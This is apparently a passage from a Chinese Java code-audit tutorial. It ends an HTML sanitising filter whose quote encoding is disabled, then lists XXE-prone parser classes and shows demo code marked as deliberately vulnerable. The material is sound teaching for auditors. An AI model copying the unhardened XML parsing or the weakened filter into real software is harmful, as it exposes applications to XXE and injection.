regexReplace(P_RIGHT_ARROW, <span class="hljs-string">&quot;&amp;gt;&quot;</span>, result);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-comment">// ---------------------------------------------------------------</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * given a user submitted input String, filter out any invalid or restricted html.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> input text (i.e. submitted by a user) than may contain html</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> &quot;clean&quot; version of input, with only valid, whitelisted html elements allowed</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">filter</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String input)</span><br>    &#123;<br>        reset();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> input;<br><br>        s = escapeComments(s);<br><br>        s = balanceHTML(s);<br><br>        s = checkTags(s);<br><br>        s = processRemoveBlanks(s);<br><br>        <span class="hljs-comment">// s = validateEntities(s);</span><br><br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAlwaysMakeTags</span><span class="hljs-params">()</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> alwaysMakeTags;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isStripComments</span><span class="hljs-params">()</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> stripComment;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">escapeComments</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String s)</span><br>    &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Matcher</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> P_COMMENTS.matcher(s);<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">if</span> (m.find())<br>        &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">match</span> <span class="hljs-operator">=</span> m.group(<span class="hljs-number">1</span>); <span class="hljs-comment">// (.*?)</span><br>            m.appendReplacement(buf, Matcher.quoteReplacement(<span class="hljs-string">&quot;&lt;!--&quot;</span> + htmlSpecialChars(match) + <span class="hljs-string">&quot;--&gt;&quot;</span>));<br>        &#125;<br>        m.appendTail(buf);<br><br>        <span class="hljs-keyword">return</span> buf.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">balanceHTML</span><span class="hljs-params">(String s)</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (alwaysMakeTags)<br>        &#123;<br>            <span class="hljs-comment">//</span><br>            <span class="hljs-comment">// try and form html</span><br>            <span class="hljs-comment">//</span><br>            s = regexReplace(P_END_ARROW, <span class="hljs-string">&quot;&quot;</span>, s);<br>            <span class="hljs-comment">// 不追加结束标签</span><br>            s = regexReplace(P_BODY_TO_END, <span class="hljs-string">&quot;&lt;$1&gt;&quot;</span>, s);<br>            s = regexReplace(P_XML_CONTENT, <span class="hljs-string">&quot;$1&lt;$2&quot;</span>, s);<br><br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-comment">//</span><br>            <span class="hljs-comment">// escape stray brackets</span><br>            <span class="hljs-comment">//</span><br>            s = regexReplace(P_STRAY_LEFT_ARROW, <span class="hljs-string">&quot;&amp;lt;$1&quot;</span>, s);<br>            s = regexReplace(P_STRAY_RIGHT_ARROW, <span class="hljs-string">&quot;$1$2&amp;gt;&lt;&quot;</span>, s);<br><br>            <span class="hljs-comment">//</span><br>            <span class="hljs-comment">// the last regexp causes &#x27;&lt;&gt;&#x27; entities to appear</span><br>            <span class="hljs-comment">// (we need to do a lookahead assertion so that the last bracket can</span><br>            <span class="hljs-comment">// be used in the next pass of the regexp)</span><br>            <span class="hljs-comment">//</span><br>            s = regexReplace(P_BOTH_ARROWS, <span class="hljs-string">&quot;&quot;</span>, s);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">checkTags</span><span class="hljs-params">(String s)</span><br>    &#123;<br>        <span class="hljs-type">Matcher</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> P_TAGS.matcher(s);<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">while</span> (m.find())<br>        &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">replaceStr</span> <span class="hljs-operator">=</span> m.group(<span class="hljs-number">1</span>);<br>            replaceStr = processTag(replaceStr);<br>            m.appendReplacement(buf, Matcher.quoteReplacement(replaceStr));<br>        &#125;<br>        m.appendTail(buf);<br><br>        <span class="hljs-comment">// these get tallied in processTag</span><br>        <span class="hljs-comment">// (remember to reset before subsequent calls to filter method)</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(buf.toString());<br>        <span class="hljs-keyword">for</span> (String key : vTagCounts.keySet())<br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">ii</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; ii &lt; vTagCounts.get(key); ii++)<br>            &#123;<br>                sBuilder.append(<span class="hljs-string">&quot;&lt;/&quot;</span>).append(key).append(<span class="hljs-string">&quot;&gt;&quot;</span>);<br>            &#125;<br>        &#125;<br>        s = sBuilder.toString();<br><br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">processRemoveBlanks</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String s)</span><br>    &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> s;<br>        <span class="hljs-keyword">for</span> (String tag : vRemoveBlanks)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (!P_REMOVE_PAIR_BLANKS.containsKey(tag))<br>            &#123;<br>                P_REMOVE_PAIR_BLANKS.putIfAbsent(tag, Pattern.compile(<span class="hljs-string">&quot;&lt;&quot;</span> + tag + <span class="hljs-string">&quot;(\\s[^&gt;]*)?&gt;&lt;/&quot;</span> + tag + <span class="hljs-string">&quot;&gt;&quot;</span>));<br>            &#125;<br>            result = regexReplace(P_REMOVE_PAIR_BLANKS.get(tag), <span class="hljs-string">&quot;&quot;</span>, result);<br>            <span class="hljs-keyword">if</span> (!P_REMOVE_SELF_BLANKS.containsKey(tag))<br>            &#123;<br>                P_REMOVE_SELF_BLANKS.putIfAbsent(tag, Pattern.compile(<span class="hljs-string">&quot;&lt;&quot;</span> + tag + <span class="hljs-string">&quot;(\\s[^&gt;]*)?/&gt;&quot;</span>));<br>            &#125;<br>            result = regexReplace(P_REMOVE_SELF_BLANKS.get(tag), <span class="hljs-string">&quot;&quot;</span>, result);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">regexReplace</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Pattern regex_pattern, <span class="hljs-keyword">final</span> String replacement, <span class="hljs-keyword">final</span> String s)</span><br>    &#123;<br>        <span class="hljs-type">Matcher</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> regex_pattern.matcher(s);<br>        <span class="hljs-keyword">return</span> m.replaceAll(replacement);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">processTag</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String s)</span><br>    &#123;<br>        <span class="hljs-comment">// ending tags</span><br>        <span class="hljs-type">Matcher</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> P_END_TAG.matcher(s);<br>        <span class="hljs-keyword">if</span> (m.find())<br>        &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> m.group(<span class="hljs-number">1</span>).toLowerCase();<br>            <span class="hljs-keyword">if</span> (allowed(name))<br>            &#123;<br>                <span class="hljs-keyword">if</span> (!inArray(name, vSelfClosingTags))<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (vTagCounts.containsKey(name))<br>                    &#123;<br>                        vTagCounts.put(name, vTagCounts.get(name) - <span class="hljs-number">1</span>);<br>                        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;/&quot;</span> + name + <span class="hljs-string">&quot;&gt;&quot;</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// starting tags</span><br>        m = P_START_TAG.matcher(s);<br>        <span class="hljs-keyword">if</span> (m.find())<br>        &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> m.group(<span class="hljs-number">1</span>).toLowerCase();<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> m.group(<span class="hljs-number">2</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">ending</span> <span class="hljs-operator">=</span> m.group(<span class="hljs-number">3</span>);<br><br>            <span class="hljs-comment">// debug( &quot;in a starting tag, name=&#x27;&quot; + name + &quot;&#x27;; body=&#x27;&quot; + body + &quot;&#x27;; ending=&#x27;&quot; + ending + &quot;&#x27;&quot; );</span><br>            <span class="hljs-keyword">if</span> (allowed(name))<br>            &#123;<br>                <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">params</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>                <span class="hljs-keyword">final</span> <span class="hljs-type">Matcher</span> <span class="hljs-variable">m2</span> <span class="hljs-operator">=</span> P_QUOTED_ATTRIBUTES.matcher(body);<br>                <span class="hljs-keyword">final</span> <span class="hljs-type">Matcher</span> <span class="hljs-variable">m3</span> <span class="hljs-operator">=</span> P_UNQUOTED_ATTRIBUTES.matcher(body);<br>                <span class="hljs-keyword">final</span> List&lt;String&gt; paramNames = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>                <span class="hljs-keyword">final</span> List&lt;String&gt; paramValues = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>                <span class="hljs-keyword">while</span> (m2.find())<br>                &#123;<br>                    paramNames.add(m2.group(<span class="hljs-number">1</span>)); <span class="hljs-comment">// ([a-z0-9]+)</span><br>                    paramValues.add(m2.group(<span class="hljs-number">3</span>)); <span class="hljs-comment">// (.*?)</span><br>                &#125;<br>                <span class="hljs-keyword">while</span> (m3.find())<br>                &#123;<br>                    paramNames.add(m3.group(<span class="hljs-number">1</span>)); <span class="hljs-comment">// ([a-z0-9]+)</span><br>                    paramValues.add(m3.group(<span class="hljs-number">3</span>)); <span class="hljs-comment">// ([^\&quot;\\s&#x27;]+)</span><br>                &#125;<br><br>                String paramName, paramValue;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">ii</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; ii &lt; paramNames.size(); ii++)<br>                &#123;<br>                    paramName = paramNames.get(ii).toLowerCase();<br>                    paramValue = paramValues.get(ii);<br><br>                    <span class="hljs-comment">// debug( &quot;paramName=&#x27;&quot; + paramName + &quot;&#x27;&quot; );</span><br>                    <span class="hljs-comment">// debug( &quot;paramValue=&#x27;&quot; + paramValue + &quot;&#x27;&quot; );</span><br>                    <span class="hljs-comment">// debug( &quot;allowed? &quot; + vAllowed.get( name ).contains( paramName ) );</span><br><br>                    <span class="hljs-keyword">if</span> (allowedAttribute(name, paramName))<br>                    &#123;<br>                        <span class="hljs-keyword">if</span> (inArray(paramName, vProtocolAtts))<br>                        &#123;<br>                            paramValue = processParamProtocol(paramValue);<br>                        &#125;<br>                        params.append(<span class="hljs-string">&#x27; &#x27;</span>).append(paramName).append(<span class="hljs-string">&quot;=\\\&quot;&quot;</span>).append(paramValue).append(<span class="hljs-string">&quot;\\\&quot;&quot;</span>);<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (inArray(name, vSelfClosingTags))<br>                &#123;<br>                    ending = <span class="hljs-string">&quot; /&quot;</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (inArray(name, vNeedClosingTags))<br>                &#123;<br>                    ending = <span class="hljs-string">&quot;&quot;</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (ending == <span class="hljs-literal">null</span> || ending.length() &lt; <span class="hljs-number">1</span>)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (vTagCounts.containsKey(name))<br>                    &#123;<br>                        vTagCounts.put(name, vTagCounts.get(name) + <span class="hljs-number">1</span>);<br>                    &#125;<br>                    <span class="hljs-keyword">else</span><br>                    &#123;<br>                        vTagCounts.put(name, <span class="hljs-number">1</span>);<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    ending = <span class="hljs-string">&quot; /&quot;</span>;<br>                &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;&quot;</span> + name + params + ending + <span class="hljs-string">&quot;&gt;&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// comments</span><br>        m = P_COMMENT.matcher(s);<br>        <span class="hljs-keyword">if</span> (!stripComment &amp;&amp; m.find())<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;&quot;</span> + m.group() + <span class="hljs-string">&quot;&gt;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">processParamProtocol</span><span class="hljs-params">(String s)</span><br>    &#123;<br>        s = decodeEntities(s);<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Matcher</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> P_PROTOCOL.matcher(s);<br>        <span class="hljs-keyword">if</span> (m.find())<br>        &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> m.group(<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (!inArray(protocol, vAllowedProtocols))<br>            &#123;<br>                <span class="hljs-comment">// bad protocol, turn into local anchor link instead</span><br>                s = <span class="hljs-string">&quot;#&quot;</span> + s.substring(protocol.length() + <span class="hljs-number">1</span>);<br>                <span class="hljs-keyword">if</span> (s.startsWith(<span class="hljs-string">&quot;#//&quot;</span>))<br>                &#123;<br>                    s = <span class="hljs-string">&quot;#&quot;</span> + s.substring(<span class="hljs-number">3</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">decodeEntities</span><span class="hljs-params">(String s)</span><br>    &#123;<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br><br>        <span class="hljs-type">Matcher</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> P_ENTITY.matcher(s);<br>        <span class="hljs-keyword">while</span> (m.find())<br>        &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">match</span> <span class="hljs-operator">=</span> m.group(<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">decimal</span> <span class="hljs-operator">=</span> Integer.decode(match).intValue();<br>            m.appendReplacement(buf, Matcher.quoteReplacement(chr(decimal)));<br>        &#125;<br>        m.appendTail(buf);<br>        s = buf.toString();<br><br>        buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        m = P_ENTITY_UNICODE.matcher(s);<br>        <span class="hljs-keyword">while</span> (m.find())<br>        &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">match</span> <span class="hljs-operator">=</span> m.group(<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">decimal</span> <span class="hljs-operator">=</span> Integer.valueOf(match, <span class="hljs-number">16</span>).intValue();<br>            m.appendReplacement(buf, Matcher.quoteReplacement(chr(decimal)));<br>        &#125;<br>        m.appendTail(buf);<br>        s = buf.toString();<br><br>        buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        m = P_ENCODE.matcher(s);<br>        <span class="hljs-keyword">while</span> (m.find())<br>        &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">match</span> <span class="hljs-operator">=</span> m.group(<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">decimal</span> <span class="hljs-operator">=</span> Integer.valueOf(match, <span class="hljs-number">16</span>).intValue();<br>            m.appendReplacement(buf, Matcher.quoteReplacement(chr(decimal)));<br>        &#125;<br>        m.appendTail(buf);<br>        s = buf.toString();<br><br>        s = validateEntities(s);<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">validateEntities</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String s)</span><br>    &#123;<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br><br>        <span class="hljs-comment">// validate entities throughout the string</span><br>        <span class="hljs-type">Matcher</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> P_VALID_ENTITIES.matcher(s);<br>        <span class="hljs-keyword">while</span> (m.find())<br>        &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">one</span> <span class="hljs-operator">=</span> m.group(<span class="hljs-number">1</span>); <span class="hljs-comment">// ([^&amp;;]*)</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">two</span> <span class="hljs-operator">=</span> m.group(<span class="hljs-number">2</span>); <span class="hljs-comment">// (?=(;|&amp;|$))</span><br>            m.appendReplacement(buf, Matcher.quoteReplacement(checkEntity(one, two)));<br>        &#125;<br>        m.appendTail(buf);<br><br>        <span class="hljs-keyword">return</span> encodeQuotes(buf.toString());<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">encodeQuotes</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String s)</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (encodeQuotes)<br>        &#123;<br>            <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">buf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>            <span class="hljs-type">Matcher</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> P_VALID_QUOTES.matcher(s);<br>            <span class="hljs-keyword">while</span> (m.find())<br>            &#123;<br>                <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">one</span> <span class="hljs-operator">=</span> m.group(<span class="hljs-number">1</span>); <span class="hljs-comment">// (&gt;|^)</span><br>                <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">two</span> <span class="hljs-operator">=</span> m.group(<span class="hljs-number">2</span>); <span class="hljs-comment">// ([^&lt;]+?)</span><br>                <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">three</span> <span class="hljs-operator">=</span> m.group(<span class="hljs-number">3</span>); <span class="hljs-comment">// (&lt;|$)</span><br>                <span class="hljs-comment">// 不替换双引号为&amp;quot;，防止json格式无效 regexReplace(P_QUOTE, &quot;&amp;quot;&quot;, two)</span><br>                m.appendReplacement(buf, Matcher.quoteReplacement(one + two + three));<br>            &#125;<br>            m.appendTail(buf);<br>            <span class="hljs-keyword">return</span> buf.toString();<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> s;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">checkEntity</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String preamble, <span class="hljs-keyword">final</span> String term)</span><br>    &#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;;&quot;</span>.equals(term) &amp;&amp; isValidEntity(preamble) ? <span class="hljs-string">&#x27;&amp;&#x27;</span> + preamble : <span class="hljs-string">&quot;&amp;amp;&quot;</span> + preamble;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isValidEntity</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String entity)</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> inArray(entity, vAllowedEntities);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">inArray</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String s, <span class="hljs-keyword">final</span> String[] array)</span><br>    &#123;<br>        <span class="hljs-keyword">for</span> (String item : array)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (item != <span class="hljs-literal">null</span> &amp;&amp; item.equals(s))<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">allowed</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String name)</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> (vAllowed.isEmpty() || vAllowed.containsKey(name)) &amp;&amp; !inArray(name, vDisallowed);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">allowedAttribute</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String name, <span class="hljs-keyword">final</span> String paramName)</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> allowed(name) &amp;&amp; (vAllowed.isEmpty() || vAllowed.get(name).contains(paramName));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h5><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入</p><p>关键字</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Java">DocumentBuilder、XMLStreamReader、SAXBuilder、SAXParser<br>SAXReader 、XMLReader<br>SAXSource 、TransformerFactory 、SAXTransformerFactory 、<br>SchemaFactory<br>xml<br>HttpClient.execute<br>HttpClient.executeMethod<br>HttpURLConnection.connect<br>HttpURLConnection.getInputStream<br>URL.openStream<br></code></pre></td></tr></table></figure><p>敏感类及函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.xml.parsers.DocumentBuilderFactory<br>javax.xml.parsers.SAXParser<br>javax.xml.transform.TransformerFactory<br>javax.xml.validation.Validator<br>javax.xml.validation.SchemaFactory<br>javax.xml.transform.sax.SAXTransformerFactory<br>javax.xml.transform.sax.SAXSource<br>org.xml.sax.XMLReader<br>org.xml.sax.helpers.XMLReaderFactory<br>org.dom4j.io.SAXReader<br>org.jdom.input.SAXBuilder<br>org.jdom2.input.SAXBuilder<br>javax.xml.bind.Unmarshaller<br>javax.xml.xpath.XpathExpression<br>javax.xml.stream.XMLStreamReader<br>org.apache.commons.digester3.Digester<br></code></pre></td></tr></table></figure><p>研究代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.Demo;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.xml.parsers.DocumentBuilder;  <br><span class="hljs-keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;<br><span class="hljs-keyword">import</span> javax.xml.parsers.ParserConfigurationException;<br><br><span class="hljs-keyword">import</span> org.w3c.dom.Document;<br><span class="hljs-keyword">import</span> org.w3c.dom.Node;<br><span class="hljs-keyword">import</span> org.w3c.dom.NodeList;<br><span class="hljs-keyword">import</span> org.xml.sax.SAXException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span>  <span class="hljs-title class_">XmlReader</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">selText</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> ParserConfigurationException, SAXException, IOException &#123;<br>        <span class="hljs-comment">//实例化解析器工厂</span><br>        <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">builderFactory</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();  <span class="hljs-comment">//漏洞所在</span><br>        <br>        <span class="hljs-comment">//根据解析器工厂实例化解析器</span><br>        <span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> builderFactory.newDocumentBuilder();<br>        <span class="hljs-comment">//获取xml的全部节点（根据xml的层级结构在内存中分配一个树形结构，把xml的标签，属性和文本都封装成对象）</span><br>        <span class="hljs-type">Document</span> <span class="hljs-variable">document</span> <span class="hljs-operator">=</span> builder.parse(request.getInputStream());<br>        <span class="hljs-comment">//根据标签名获取</span><br>        <span class="hljs-type">NodeList</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> document.getElementsByTagName(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span> ; i&lt;list.getLength() ; i++) &#123;<br>            <span class="hljs-comment">//获取每一个name节点</span><br>            <span class="hljs-type">Node</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> list.item(i);<br>            <span class="hljs-comment">//获取每个name节点里面的文本</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">nametext</span> <span class="hljs-operator">=</span> name.getTextContent();<br>            <span class="hljs-comment">//输出文本</span><br>            <span class="hljs-keyword">return</span> nametext;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XmlReader</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">selText2</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> IOException, DocumentException &#123;<br>        <span class="hljs-type">SAXReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXReader</span>(); <span class="hljs-comment">//漏洞函数</span><br>        <span class="hljs-type">Document</span> <span 